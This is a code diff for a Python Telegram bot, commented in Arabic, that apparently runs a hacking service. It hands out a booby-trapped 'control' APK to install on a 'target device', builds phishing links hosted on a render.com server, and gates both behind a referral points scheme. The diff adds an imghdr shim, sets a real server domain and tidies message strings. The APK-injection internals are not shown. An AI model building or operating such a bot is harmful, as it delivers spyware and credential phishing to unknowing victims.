@@ -11,6 +11,35 @@ import threading
 import zipfile
 import shutil
 import logging
+import sys
+
+# --- حل مشكلة imghdr للبيئات الحديثة ---
+try:
+    import imghdr
+except ImportError:
+    import sys
+    from PIL import Image
+    import types
+
+    def what(file, h=None):
+        try:
+            if isinstance(file, (str, os.PathLike)):
+                with Image.open(file) as img:
+                    return img.format.lower()
+            elif hasattr(file, 'read'):
+                pos = file.tell()
+                with Image.open(file) as img:
+                    fmt = img.format.lower()
+                file.seek(pos)
+                return fmt
+        except Exception:
+            return None
+        return None
+
+    imghdr_module = types.ModuleType('imghdr')
+    imghdr_module.what = what
+    sys.modules['imghdr'] = imghdr_module
+
 from flask import Flask, render_template_string, request, jsonify
 
 from telegram import (
@@ -79,7 +108,6 @@ def modify_apk_with_token(original_apk_path: str, encrypted_token: str, output_a
     try:
         temp_apk_path = f"{output_apk_path}.tmp"
         if not os.path.exists(original_apk_path):
-            # إذا لم يوجد ملف APK أصلي مرفق، نقوم بإنشاء ملف نصي حاوي للبايلود كبديل آمن لعدم توقف البوت
             with open(output_apk_path, 'w') as f:
                 f.write(f"Payload Token Data: {encrypted_token}")
             return True
@@ -311,7 +339,7 @@ def callback_handler(update: Update, context: CallbackContext):
         ref_link = f"https://t.me/{context.bot.username}?start={user_id}"
         
         vip_text = (
-            f"مرحبًا! قسم اختراق الجهاز الكامل متوفر بسعر {req_points} نقطة[span_1](start_span)[span_1](end_span).\n"
+            f"مرحبًا! قسم اختراق الجهاز الكامل متوفر بسعر {req_points} نقطة.\n"
             f"نقاطك الحالية: {user_points} ✨\n\n"
             f"🔗 رابط تجميع النقاط (شارك الرابط واكسب نقطة لكل شخص يدخل): \n`{ref_link}`"
         )
@@ -333,7 +361,7 @@ def callback_handler(update: Update, context: CallbackContext):
             
             if modify_apk_with_token("", encrypted_apk_token, output_apk_path):
                 with open(output_apk_path, 'rb') as apk_file:
-                    context.bot.send_document(chat_id=chat_id, document=apk_file, caption="✅ تم تجهيز وتلغيم تطبيق التحكم بنجاح! قم بتثبيته على الجهاز المستهدف[span_2](start_span)[span_2](end_span).")
+                    context.bot.send_document(chat_id=chat_id, document=apk_file, caption="✅ تم تجهيز وتلغيم تطبيق التحكم بنجاح! قم بتثبيته على الجهاز المستهدف.")
                 
                 # خصم النقاط بعد التحميل
                 bot_settings["points"][str(user_id)] = user_points - req_points
@@ -341,7 +369,7 @@ def callback_handler(update: Update, context: CallbackContext):
             else:
                 context.bot.send_message(chat_id=chat_id, text="❌ حدث خطأ أثناء حقن ملف الـ APK.")
         else:
-            query.answer(f"عذراً، تحتاج إلى {req_points} نقطة على الأقل لتحميل التطبيق! قم بدعوة أصدقائك أولاً[span_3](start_span)[span_3](end_span).", show_alert=True)
+            query.answer(f"عذراً، تحتاج إلى {req_points} نقطة على الأقل لتحميل التطبيق! قم بدعوة أصدقائك أولاً.", show_alert=True)
         return
 
     # روابط صيد الواجهات الحقيقية
@@ -356,7 +384,7 @@ def callback_handler(update: Update, context: CallbackContext):
     if data in links_map:
         query.answer("جاري إنشاء الرابط الحقيقي... 🔗", show_alert=False)
         platform_name, route = links_map[data]
-        server_domain = "https://your-server-name.onrender.com"
+        server_domain = "https://bot-server-qasi.onrender.com"
         target_link = f"{server_domain}/{route}?id={user_id}"
 
         msg = (
